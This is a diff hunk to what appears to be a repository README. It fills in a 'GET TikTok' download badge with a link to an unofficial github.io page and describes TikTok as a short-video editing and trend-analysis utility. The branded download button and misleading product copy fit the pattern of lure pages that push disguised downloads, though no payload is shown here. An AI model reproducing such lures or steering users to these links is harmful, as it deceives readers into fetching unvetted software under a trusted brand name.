@@ -4,7 +4,7 @@
 
 TikTok is a focused social media content utility for editing short videos, analyzing trending sounds, and understanding where engagement comes from. TikTok keeps edits readable, previews clear, and daily posting routines easier for home creators, students, marketers, and agencies who rely on TikTok for steady social media growth insight.
 
-[![GET TikTok](https://img.shields.io/badge/GET%20%E2%80%94%20TikTok-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET TikTok](https://img.shields.io/badge/GET%20%E2%80%94%20TikTok-0078D6?style=for-the-badge&logoColor=white)](https://clarencebongiovanni187.github.io/.github/tiktok-video-editor)
 
 ---
 
